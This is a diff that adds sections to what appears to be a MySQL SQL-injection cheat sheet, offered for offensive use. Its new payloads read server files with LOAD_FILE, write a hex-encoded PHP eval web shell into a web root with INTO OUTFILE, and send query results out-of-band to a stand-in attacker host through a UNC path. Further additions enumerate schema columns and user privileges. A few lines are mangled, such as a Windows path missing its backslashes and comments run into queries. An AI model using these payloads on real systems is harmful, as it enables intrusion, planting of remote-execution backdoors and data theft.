@@ -22,6 +22,15 @@ Inspired by
     - [Case Statement](#Case-Statement)
     - [Conditionals](#Conditionals)
     - [Time-delay](#Time-delay)
+    - [Command Execution](#Command-Execution)
+    - [RunAs](#RunAs)
+    - [Read Files](#Read-Files)
+    - [Outfile Files to www](#Outfile-Files-to-www)
+    - [Out-of-Band Retrieval](#Out-of-Band-Retrieval)
+    - [Substrings](#Substrings)
+    - [Retrieve Nth Line](#Retrieve-Nth-Line)
+    - [Select Nth Row](#Select-Nth-Row)
+    - [List Privileges](#List-Privileges)
     
     
     
@@ -156,4 +165,69 @@ SELECT BENCHMARK(1000000,MD5(‘A’));
 SELECT SLEEP(5); # >= 5.0.12
 ```
 
+### Command Execution
+
+```
+http://dev.mysql.com/doc/refman/5.1/en/adding-udf.html
+```
+
+### RunAs
+
+```
+N/A
+```
+
+### Read Files
+
+```
+SELECT LOAD_FILE('C:Windowswin.ini');
+```
+
+### Outfile Files to www
+
+```
+select 0x3C3F706870206576616C28245F504F53545B7A5D293B3F3E into outfile '/usr/local/var/www/webshell.php' # <?php eval($_POST[z]);?>"
+```
+
+### Out-of-Band Retrieval
+
+```
+SELECT LOAD_FILE(concat('\\',(SELECT 1), 'attacker.controlledserver.com\')));
+```
+
+### Substrings
+
+```
+SELECT substr('Foobr', 1, 1);
+```
+
+### Retrieve Nth Line
+
+```
+SELECT * FROM table ORDER BY ID LIMIT 3,1
+````
+
+### Select Nth Row
+
+```
+SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename' limit 1 offset 1    #bypass limit 1,1
+SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename' limit 1 offset 2
+```
+
+### List Privileges
+
+```
+SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges;
+```
+
+```
+
+    # list user privsSELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user;
+   
+    # priv, list user privsSELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges;
+    
+    # list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;
+    
+    # list privs on columns
+```
 
